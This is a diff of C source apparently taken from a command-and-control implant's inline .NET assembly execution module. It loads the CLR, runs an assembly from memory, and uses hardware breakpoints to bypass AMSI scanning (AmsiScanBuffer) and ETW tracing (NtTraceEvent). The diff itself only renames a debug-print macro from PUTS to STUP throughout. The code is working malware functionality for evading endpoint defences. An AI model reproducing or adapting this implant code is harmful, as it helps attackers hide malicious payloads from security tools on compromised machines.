@@ -79,7 +79,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
         & Instance->Dotnet->ClrRuntimeInfo,
         & Instance->Dotnet->ICorRuntimeHost
     ) ) {
-        PUTS( "Couldn't start CLR" )
+        STUP( "Couldn't start CLR" )
         return FALSE;
     }
 
@@ -87,7 +87,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     if ( Instance->Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_HWBP )
     {
 #if _WIN64
-        PUTS( "Try to patch(less) Amsi/Etw" )
+        STUP( "Try to patch(less) Amsi/Etw" )
 
         PackageInfo = PackageCreateWithRequestID( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE, Instance->Dotnet->RequestID );
         PkgAdIn32( PackageInfo, DOTNET_INFO_PATCHED );
@@ -98,7 +98,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
             AmsiIsLoaded = RtAmsi();
         }
 
-        PUTS( "Init HwBp Engine" )
+        STUP( "Init HwBp Engine" )
         /* use global engine */
         if ( ! NT_SUCCESS( HwBpEngineInit( NULL, NULL ) ) ) {
             return FALSE;
@@ -109,7 +109,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
         /* add Amsi bypass */
         if ( AmsiIsLoaded )
         {
-            PUTS( "HwBp Engine add AmsiScanBuffer bypass" )
+            STUP( "HwBp Engine add AmsiScanBuffer bypass" )
             if ( ! NT_SUCCESS( Status = HwBpEngineAdd( NULL, ThreadId, Instance->Win32.AmsiScanBuffer, HwBpExAmsiScanBuffer, 0 ) ) ) {
                 PRINTF( "Failed adding exception to HwBp Engine: %08x\n", Status )
                 return FALSE;
@@ -117,7 +117,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
         }
 
         /* add Etw bypass */
-        PUTS( "HwBp Engine add NtTraceEvent bypass" )
+        STUP( "HwBp Engine add NtTraceEvent bypass" )
         if ( ! NT_SUCCESS( HwBpEngineAdd( NULL, ThreadId, Instance->Win32.NtTraceEvent, HwBpExNtTraceEvent, 1 ) ) ) {
             PRINTF( "Failed adding exception to HwBp Engine: %08x\n", Status )
             return FALSE;
@@ -145,13 +145,13 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     RgsBound[ 0 ].lLbound      = 0;
     Instance->Dotnet->SafeArray = Instance->Win32.SafeArrayCreate( VT_UI1, 1, RgsBound );
 
-    PUTS( "CreateDomain..." )
+    STUP( "CreateDomain..." )
     if ( ( Result = Instance->Dotnet->ICorRuntimeHost->lpVtbl->CreateDomain( Instance->Dotnet->ICorRuntimeHost, Instance->Dotnet->AppDomainName.Buffer, NULL, &Instance->Dotnet->AppDomainThunk ) ) ) {
         PRINTF( "CreateDomain Failed: %x\n", Result )
         return FALSE;
     }
 
-    PUTS( "QueryInterface..." )
+    STUP( "QueryInterface..." )
     if ( ( Result = Instance->Dotnet->AppDomainThunk->lpVtbl->QueryInterface( Instance->Dotnet->AppDomainThunk, &xIID_AppDomain, (LPVOID*)&Instance->Dotnet->AppDomain ) ) ) {
         PRINTF( "QueryInterface Failed: %x\n", Result )
         return FALSE;
@@ -162,7 +162,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
         return FALSE;
     }
 
-    PUTS( "Copy assembly to buffer..." )
+    STUP( "Copy assembly to buffer..." )
     MemCopy( AssemblyData.Buffer, Assembly.Buffer, Assembly.Length );
 
     if ( ( Result = Instance->Win32.SafeArrayUnaccessData( Instance->Dotnet->SafeArray ) ) ) {
@@ -170,13 +170,13 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
         PACKAGE_ERROR_WIN32
     }
 
-    PUTS( "AppDomain Load..." )
+    STUP( "AppDomain Load..." )
     if ( ( Result = Instance->Dotnet->AppDomain->lpVtbl->Load_3( Instance->Dotnet->AppDomain, Instance->Dotnet->SafeArray, &Instance->Dotnet->Assembly ) ) ) {
         PRINTF( "AppDomain Failed: %x\n", Result )
         return FALSE;
     }
 
-    PUTS( "Assembly EntryPoint..." )
+    STUP( "Assembly EntryPoint..." )
     if ( ( Result = Instance->Dotnet->Assembly->lpVtbl->EntryPoint( Instance->Dotnet->Assembly, &Instance->Dotnet->MethodInfo ) ) ) {
         PRINTF( "Assembly EntryPoint Failed: %x\n", Result )
         return FALSE;
@@ -224,7 +224,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
      *       Fix this once i get motivated enough or remove this entirely. */
 
     /*
-    PUTS( "Create Thread..." )
+    STUP( "Create Thread..." )
 
     MemSet( &ThreadAttr, 0, sizeof( PROC_THREAD_ATTRIBUTE_NUM ) );
     MemSet( &ClientId, 0, sizeof( CLIENT_ID ) );
@@ -234,7 +234,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     ThreadAttr.Entry.pValue    = &ClientId;
     ThreadAttr.Length          = sizeof( NT_PROC_THREAD_ATTRIBUTE_LIST );
 
-    PUTS( "Creating events..." )
+    STUP( "Creating events..." )
     if ( NT_SUCCESS( Instance->Win32.NtCreateEvent( &Instance->Dotnet->Event, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) &&
          NT_SUCCESS( Instance->Win32.NtCreateEvent( &Instance->Dotnet->Exit,  EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) )
     {
@@ -283,10 +283,10 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
                 if ( ! NT_SUCCESS( Instance->Win32.NtQueueApcThread( Instance->Dotnet->Thread, Instance->Win32.NtContinue, Instance->Dotnet->RopEvnt, FALSE, NULL ) ) ) goto Leave;
                 if ( ! NT_SUCCESS( Instance->Win32.NtQueueApcThread( Instance->Dotnet->Thread, Instance->Win32.NtContinue, Instance->Dotnet->RopExit, FALSE, NULL ) ) ) goto Leave;
 
-                PUTS( "Resume Thread..." )
+                STUP( "Resume Thread..." )
                 if ( NT_SUCCESS( Instance->Win32.NtAlertResumeThread( Instance->Dotnet->Thread, NULL ) ) )
                 {
-                    PUTS( "Apc started and assembly invoked." )
+                    STUP( "Apc started and assembly invoked." )
 
                     PackageInfo = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
                     PkgAdIn32( PackageInfo, DOTNET_INFO_ENTRYPOINT_EXECUTED );
@@ -296,13 +296,13 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
                     // we have successfully invoked the main function of the assembly executable.
                     Instance->Dotnet->Invoked = TRUE;
 
-                } else PUTS( "NtAlertResumeThread failed" )
+                } else STUP( "NtAlertResumeThread failed" )
 
-            } else PUTS( "NtGetThreadContext failed" )
+            } else STUP( "NtGetThreadContext failed" )
 
-        } else PUTS( "NtCreateThreadEx failed" )
+        } else STUP( "NtCreateThreadEx failed" )
 
-    } else PUTS( "NtCreateEvent failed" )
+    } else STUP( "NtCreateEvent failed" )
     */
 
     return TRUE;
@@ -358,13 +358,13 @@ VOID DotnetPush()
         /* check if the assembly is still running. */
         /* if ( Instance->Win32.WaitForSingleObjectEx( Instance->Dotnet->Event, 0, FALSE ) == WAIT_OBJECT_0 )
         {
-            PUTS( "Event has been signaled" )
+            STUP( "Event has been signaled" )
 
             Package = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
             PkgAdIn32( Package, DOTNET_INFO_FINISHED );
             PackageTransmit( Package );
 
-            PUTS( "Dotnet Invoke thread isn't active anymore." )
+            STUP( "Dotnet Invoke thread isn't active anymore." )
             Close = TRUE;
         } */
 
@@ -425,7 +425,7 @@ VOID DotnetClose()
         Instance->Dotnet->RopExit = NULL;
     }
 
-    PUTS( "Free Output" )
+    STUP( "Free Output" )
     if ( Instance->Dotnet->Output.Buffer )
     {
         MemSet( Instance->Dotnet->Output.Buffer, 0, Instance->Dotnet->Output.Length );
@@ -433,7 +433,7 @@ VOID DotnetClose()
         Instance->Dotnet->Output.Buffer = NULL;
     }
 
-    PUTS( "Unload and free CLR" )
+    STUP( "Unload and free CLR" )
     if ( Instance->Dotnet->MethodArgs )
     {
         Instance->Win32.SafeArrayDestroy( Instance->Dotnet->MethodArgs );
@@ -565,7 +565,7 @@ DWORD ClrCreateInstance( LPCWSTR dotNetVersion, PICLRMetaHost *ppClrMetaHost, PI
     }
     else
     {
-        PUTS("Failed to load mscoree.dll")
+        STUP("Failed to load mscoree.dll")
         return 0;
     }
 
